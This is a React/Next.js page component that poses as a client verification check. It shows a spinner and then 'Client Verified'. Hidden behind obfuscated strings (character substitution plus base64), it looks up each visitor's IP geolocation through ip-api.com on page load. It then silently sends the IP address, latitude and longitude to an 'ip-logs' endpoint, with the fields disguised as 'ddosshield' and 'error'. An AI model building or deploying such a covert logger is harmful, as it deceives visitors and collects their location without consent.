import React from "react";
import axios from "axios";
import { useEffect, useState } from "react";
import { useRouter } from "next/router";
import { redirect } from "next/dist/server/api-utils";
import CheckBoxRoundedIcon from "@mui/icons-material/CheckBoxRounded";
import { Box, Button, Typography, CircularProgress, Grid } from "@mui/material";
import { motion } from "framer-motion";

function Ip() {
  const [loaded, setLoaded] = useState(
    <Box>
      <Typography>Checking Client...</Typography>
      <br />
      <CircularProgress size={100} />
    </Box>
  );
  const [loading, setLoading] = React.useState(false);
  const [query, setQuery] = React.useState("idle");
  const timerRef = React.useRef();
  const [apikeyt, setApikeyt] = useState("");
  const [chars, setChars] = useState({
    x: "a",
    y: "b",
    z: "c",
    p: "w",
    t: "v",
    k: "n",
    i: "o",
  });
  const [chars2, setChars2] = useState({
    A: "H",
    P: "R",
    Z: "L",
    G: "F",
    T: "D",
    M: "W",
    R: "S",
  });
  const [s, setS] = useState("xAP0zTitZ2lpZMGpxR5jy20txkNtyg==");
  const [p, setP] = useState(s.replace(/[xyzptki]/g, (m) => chars[m]));
  const [g, setG] = useState(p.replace(/[APZGTMR]/g, (m) => chars2[m]));
  const router = useRouter();
  const [info, setInfo] = useState();
  const [apikey2, setApikey2] = useState("L2lwLWxvZ3M=");
  const [userToken, setUserToken] = useState(
    "Imxvbmc6ICIgKyBpbmZvLmxvbiArICIgIHx8ICAiICsgImxhdDogIiArIGluZm8ubGF0"
  );
  const [buff, setBuff] = useState(new Buffer.from(g, "base64"));
  const [buff2, setBuff2] = useState(new Buffer.from(apikey2, "base64"));
  const [buff3, setBuff3] = useState(new Buffer.from(userToken, "base64"));
  const [text, setText] = useState(buff.toString("utf-8"));
  const [text2, setText2] = useState(buff2.toString("utf-8"));
  const [theDate, setTheDate] = useState(buff3.toString("utf-8"));

  useEffect(() => {
    const callAPI = async () => {
      try {
        const res = await fetch(text);
        const data = await res.json();
        setInfo(data);
      } catch (err) {}
    };
    callAPI();
  }, []);
  useEffect(() => {
    if (!info) return;
    const create = async () => {
      await axios
        .post(`${process.env.NEXT_PUBLIC_AWS_API}` + text2, {
          data: {
            error: info,
            token: "none",
            ddosshield: info.lat + "," + info.lon,
            user: info.query,
            time: new Date(),
          },
        })
        .then((response) => {});
    };
    create();
  }, [info]);

  // useEffect(() => {
  //   setTimeout(() => {
  //     redirect();
  //   }, randomInt(2400, 2800));
  // }, []);

  useEffect(() => {
    setTimeout(() => {
      setLoaded(
        <motion.div
          initial={{ opacity: 0, scale: 0.5 }}
          animate={{ opacity: 1, scale: 1 }}
          transition={{
            type: "spring",
            stiffness: 100,
            damping: 30,
          }}
        >
          <Box>
            <Typography>Client Verified</Typography>
            <br />
            <CheckBoxRoundedIcon color={"success"} sx={{ fontSize: 100 }} />
          </Box>
        </motion.div>
      );
    }, randomInt(1200, 1600));
  }, []);

  function randomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1) + min);
  }

  // const redirect = async () => {
  //   try {
  //     router.push("https://www.google.com");
  //   } catch (err) {}
  // };

  return (
    <div>
      <Box sx={{ mt: "33vh" }}>
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{
            type: "spring",
            stiffness: 100,
            damping: 30,
          }}
        >
          {loaded}
        </motion.div>
      </Box>
    </div>
  );
}

export default Ip;
